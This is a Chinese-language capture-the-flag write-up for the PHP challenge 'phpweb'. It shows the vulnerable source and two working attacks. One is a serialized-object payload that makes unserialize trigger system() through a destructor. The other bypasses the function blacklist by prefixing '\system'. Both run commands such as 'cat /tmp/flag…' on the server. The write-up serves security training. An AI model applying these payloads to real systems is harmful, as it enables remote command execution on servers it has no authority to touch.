# [网鼎杯 2020 朱雀组]phpweb 1

- 进入网页，给我吓了一跳，~~什么玩意儿这是~~，查看源码没看出什么东西，抓包，发现了POST传参

> <img src="../../IMG3/Screenshot 2024-06-17 205230.png">

- 看网页的报错信息，这里的func就是传入的函数名，p则是参数，直接尝试getshell，发现被过滤了

`func=system&p=ls /`

> <img src="../../IMG3/Screenshot 2024-06-17 205442.png">

- 尝试文件包含函数，发现 `file_get_contents` 可用，开始代码审计

`func=file_get_contents&p=index.php`

```php
<?php
$disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
function gettime($func, $p) {
    $result = call_user_func($func, $p);
    $a= gettype($result);
    if ($a == "string") {
        return $result;
    } else {return "";}
}
class Test {
    var $p = "Y-m-d h:i:s a";
    var $func = "date";
    function __destruct() {
        if ($this->func != "") {
            echo gettime($this->func, $this->p);
        }
    }
}
$func = $_REQUEST["func"];
$p = $_REQUEST["p"];

if ($func != null) {
    $func = strtolower($func);
    if (!in_array($func,$disable_fun)) {
        echo gettime($func, $p);
    }else {
        die("Hacker...");
    }
}
```

## 方法一

- 这道题对很多的函数进行了黑名单过滤，包括 `system()` ， `eval()` ， `exec()` 等，但是仍有很多函数可以利用，结合代码中的出现的类，我们使用反序列化函数 `unserialize()`

```php
<?php
class Test {
    var $p = "ls /";
    var $func = "system";
}

$test = new Test();
echo serialize($test);
```

- 将得到的序列化字符串传入网页

`func=unserialize&p=O:4:"Test":2:{s:1:"p";s:4:"ls /";s:4:"func";s:6:"system";}`

> <img src="../../IMG3/Screenshot 2024-06-17 210356.png">

- 没有发现flag，尝试搜索

`func=unserialize&p=O:4:"Test":2:{s:1:"p";s:18:"find / -name flag*";s:4:"func";s:6:"system";}`

> <img src="../../IMG3/Screenshot 2024-06-17 210519.png">

- 发现可疑文件 `/tmp/flagoefiu4r93` ，获取内容，得到flag

`func=unserialize&p=O:4:"Test":2:{s:1:"p";s:22:"cat /tmp/flagoefiu4r93";s:4:"func";s:6:"system";}`

> <img src="../../IMG3/Screenshot 2024-06-17 210623.png">

## 方法二

- 这道题对函数名进行了过滤，但是 `call_user_func()` 函数有个缺陷，即是如果传入的函数名前有特殊字符 `\`  ，`call_user_func()` 函数会忽略特殊字符并进行执行

`func=\system&p=ls /`

> <img src="../../IMG3/Screenshot 2024-06-17 211640.png">

- 后面的步骤详见上文方法一